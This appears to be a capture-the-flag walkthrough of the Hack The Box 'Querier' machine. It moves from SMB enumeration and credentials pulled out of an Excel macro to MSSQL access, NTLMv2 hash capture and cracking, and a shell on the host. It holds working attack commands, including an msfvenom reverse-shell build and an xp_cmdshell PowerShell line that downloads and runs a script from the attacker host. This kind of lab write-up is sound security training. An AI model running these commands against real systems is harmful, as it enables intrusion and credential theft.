
![image](https://user-images.githubusercontent.com/68326057/117534926-1b118e00-b011-11eb-8fe6-5fd71635732f.png)

# NMAP

```bash
PORT     STATE SERVICE       REASON  VERSION

135/tcp  open  msrpc         syn-ack Microsoft Windows RPC

139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn

445/tcp  open  microsoft-ds? syn-ack

1433/tcp open  ms-sql-s      syn-ack Microsoft SQL Server 2017 14.00.1000.00; RTM

| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: QUERIER
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: QUERIER.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-05-08T09:57:45
| Not valid after:  2051-05-08T09:57:45
| MD5:   ce4d a524 93d1 98d2 e8f6 f77e be42 fa10
| SHA-1: 6971 1ae2 44bc 191a 6867 d436 53a9 108f aa9d b147
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQQtoCy84EL59AI92mIZlGeTANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjEwNTA4MDk1NzQ1WhgPMjA1MTA1MDgwOTU3NDVaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAL2hai6j
| kDtAwcDySiq6BeYCPi7Tcbnp/wiR4PxgO9yd8S4hS1DgnAAyyEW1s8AiQj+JANrv
| PV3cuXn2k+oaJ3bVuANQnjeh6f70HosUv1MkTN4k8IGSWU9+gMfsG2VUK6GMRtbu
| gsiJUmkl3eRIvXgrCYEFW6YMlPTsGbou3oSj3pKUutwCDp4mno6ooUk5zh9Udrae
| 6e4z7rjZhAWvqTfYEYCUTagmJUIW8BymdZQ/58AKqQFoK/AHQTr70zyderVcXJCJ
| WTC9Qalnj0UDuWTbR+gUXgQowDp6yuLXv1ymr+P9QzTFvR3jdFB7JyeWSwf98+sQ
| co0Mcj8P1GToYmkCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAJXgjjwv/N0hQOFHs
| x+q0Ir1X0obBlT+NoY/syZ+NpOv0dx6ABzthjKckpYl6AI1kUDp3o6c8j71ypYgM
| hkJWO4G0Pmj1NkamLGCvi/dWH8a6ZiBFIJ/7JkBzttRsjS8ioqWxKQ82RhItrIe5
| 1NLnBqDwZBHH40VQUqxcCxBdnoCg4nw3MdDoq9U2GZUj9WPz7LOMOJ1+RNRPabGy
| mlbvM7dmR5Hu0xNFqpSJ1Z6um7BUSY2kL5D0sWtIL4n/Tgo00uQnD2KyYBvUv1H6
| /E/0SbmzzKG63zOEN+ePx8T0APrUnsQugAtthwvWroN/0goJ6qXu0VpGla3Pkbxj
| v40lKw==
|_-----END CERTIFICATE-----
|_ssl-date: 2021-05-08T10:00:32+00:00; -5h23m07s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -5h23m07s, deviation: 0s, median: -5h23m07s
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 10624/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 7496/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 38673/udp): CLEAN (Timeout)
|   Check 4 (port 40571/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-08T10:00:25
|_  start_date: N/A
```

# CRACKMAPEXEC

```bash
crackmapexec smb 10.10.10.125 --shares
SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False)
```

# SMBCLIENT

```bash
smbclient -L \\\\10.10.10.125
Enter WORKGROUP\kalikali's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reports         Disk      
SMB1 disabled -- no workgroup available
```

--> smbclient \\\\10.10.10.125\\Reports

![image](https://user-images.githubusercontent.com/68326057/117535150-1bf6ef80-b012-11eb-8827-4607973faa5e.png)

```bash
file Currency\ Volume\ Report.xlsm 
Currency Volume Report.xlsm: Microsoft Excel 2007+
```

![image](https://user-images.githubusercontent.com/68326057/117535417-472e0e80-b013-11eb-8cbe-53503d9ab917.png)

![image](https://user-images.githubusercontent.com/68326057/117535421-4f864980-b013-11eb-9649-2149a4d737c1.png)

## OLEVBA

```bash
olevba Currency\ Volume\ Report.xlsm 
```

![image](https://user-images.githubusercontent.com/68326057/117536448-b22e1400-b018-11eb-8c50-16bcb21d9d00.png)

```bash
Uid=reporting ;Pwd=PcwTWTHRwryjc$c6
```


# MSSQL

```bash
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth
```

![image](https://user-images.githubusercontent.com/68326057/117536575-6334ae80-b019-11eb-979a-6281201f9dfd.png)

--> https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server


![image](https://user-images.githubusercontent.com/68326057/117536694-31701780-b01a-11eb-9a8e-02ea9db7581e.png)

![image](https://user-images.githubusercontent.com/68326057/117536706-42208d80-b01a-11eb-9d35-01285a196ca3.png)


## RESPONDER

```bash
sudo responder -I tun0
```

![image](https://user-images.githubusercontent.com/68326057/117536760-9a578f80-b01a-11eb-9673-4cc4bbfb1f8a.png)


```bash
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:6370ae24bec12cba:9B1C19F60DE4076C60DCE3053A0748A5:0101000000000000C0653150DE09D201054B7892E0B90130000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000300000DC8CA80AA4857C58BA62E6CA766E5BB8B3F305DE42ABBDD3D4F2B7151EEB1E760A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0032003100000000000000000000000000
```

```bash
hashcat -m 5600 hash ../../rockyou.txt 
```

```bash
MSSQL-SVC:corporate568
```


![image](https://user-images.githubusercontent.com/68326057/117537094-8319a180-b01c-11eb-9b09-4af88a246a02.png)


```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.21 LPORT=9001 -f exe -o shell.exe
```

```bash
xp_cmdshell powershell IEX(New-object Net.WebClient).downloadstring(\"http://10.10.14.21:8000/Invoke-PowerShellTcp.ps1\")
```

![image](https://user-images.githubusercontent.com/68326057/117537632-e9ec8a00-b01f-11eb-8c74-32e52b5aac49.png)

# USER - querier\mssql-svc


```bash
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

![image](https://user-images.githubusercontent.com/68326057/117538838-55852600-b025-11eb-8d3a-c0f47793d2e4.png)


![image](https://user-images.githubusercontent.com/68326057/117538888-777ea880-b025-11eb-9580-a7554e164e28.png)


--> https://powersploit.readthedocs.io/en/latest/Privesc/Invoke-ServiceAbuse/

